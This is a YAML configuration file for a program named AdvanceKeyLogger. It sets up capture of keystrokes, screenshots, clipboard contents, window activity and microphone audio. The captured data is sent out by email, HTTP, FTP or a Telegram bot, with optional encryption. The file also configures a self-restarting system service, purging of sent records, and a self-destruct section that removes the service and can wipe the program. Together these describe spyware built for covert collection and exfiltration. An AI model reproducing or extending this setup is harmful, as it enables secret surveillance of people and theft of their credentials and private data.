general:
  report_interval: 30
  data_dir: "./data"
  log_level: "INFO"
  log_file: "./logs/app.log"
  auto_install_deps: false

capture:
  keyboard:
    enabled: false
    include_key_up: false
    max_buffer: 10000
    biometrics_enabled: false
  mouse:
    enabled: false
    track_movement: false
  screenshot:
    enabled: true
    quality: 80
    format: "png"
    capture_region: "full"
    max_count: 100
  clipboard:
    enabled: false
    poll_interval: 5
    max_length: 10000
  window:
    enabled: false
    poll_interval: 2
  audio:
    enabled: false
    duration: 10
    sample_rate: 44100
    channels: 1
    max_count: 50
    interval: 300

storage:
  backend: "local"
  max_size_mb: 500
  rotation: true
  sqlite_path: "./data/captures.db"
  purge_sent_after_seconds: 86400  # Delete sent records older than 24 hours

transport:
  method: "email"
  retry_attempts: 3
  retry_backoff: 2
  batch_size: 50
  queue_size: 1000
  failure_threshold: 5
  cooldown: 60

  email:
    smtp_server: "smtp.gmail.com"
    smtp_port: 465
    use_ssl: true
    sender: ""
    password: ""
    recipient: ""

  http:
    url: ""
    method: "POST"
    headers: {}
    timeout: 30
    verify: true
    # Path to custom CA certificate bundle (for self-signed server certs).
    # Leave empty to use system CA store (works with Let's Encrypt).
    ca_cert: ""
    healthcheck_url: ""
    healthcheck_interval: 60

  ftp:
    host: ""
    port: 21
    username: ""
    password: ""
    remote_dir: "/uploads"
    use_tls: false

  telegram:
    bot_token: ""
    chat_id: ""

encryption:
  enabled: false
  mode: "symmetric"         # "symmetric" (AES-256-CBC) or "e2e"
  algorithm: "AES-256-CBC"
  key: ""
  # E2E mode: generate server keys with `python -m server.run --generate-keys`,
  # then set transport.method to "http" and transport.http.url to
  # "http://<server-host>:8000/ingest".
  e2e:
    curve: "curve25519"
    signing: "ed25519"
    bulk_cipher: "aes-256-gcm"
    key_rotation_hours: 24
    key_store_path: "~/.advancekeylogger/keys/"
    server_public_key: ""   # base64-encoded X25519 public key from server
    pin_server_key: true
    emit_client_keys: false
    client_keys_path: ""

compression:
  enabled: true
  format: "zip"

biometrics:
  enabled: false
  sample_size: 500
  profile_id_prefix: "usr"
  store_profiles: true

profiler:
  enabled: false
  idle_gap_seconds: 300
  focus_min_seconds: 600
  emit_interval_seconds: 300
  top_n: 10
  productive_categories:
    - "work"
  categories:
    work:
      - "Visual Studio Code"
      - "IntelliJ"
      - "Terminal"
      - "Xcode"
      - "Figma"
    communication:
      - "Slack"
      - "Discord"
      - "Microsoft Teams"
      - "Zoom"
      - "Mail"
    browser:
      - "Google Chrome"
      - "Firefox"
      - "Safari"
      - "Microsoft Edge"
    entertainment:
      - "Spotify"
      - "YouTube"
      - "Netflix"
    uncategorized:
      - "*"
  store_profiles: true

pipeline:
  enabled: false
  middleware:
    - name: timestamp_enricher
      enabled: true
    - name: context_annotator
      enabled: true
    - name: deduplicator
      enabled: true
      config:
        window_seconds: 5
        types: ["clipboard", "window"]
    - name: content_truncator
      enabled: true
      config:
        default_max_length: 10000
    - name: rate_limiter
      enabled: true
      config:
        max_events_per_second: 50
    - name: conditional_router
      enabled: false
      config:
        routes:
          screenshot: "s3"
          keystroke: "sqlite"
    - name: metrics_emitter
      enabled: true
      config:
        log_interval_seconds: 60

rules:
  enabled: false
  path: "./config/rules.yaml"
  mode: "all"                 # "all" or "first"
  reload_interval_seconds: 2
  keystroke_buffer_max: 1024

service:
  name: "advancekeylogger"
  description: "AdvanceKeyLogger Monitoring Service"
  config_path: "~/.config/advancekeylogger/config.yaml"
  restart_sec: 10
  start_limit_burst: 3
  start_limit_interval: 60
  display: ":0"

self_destruct:
  secure_wipe: false
  remove_program: false
  remove_service: true
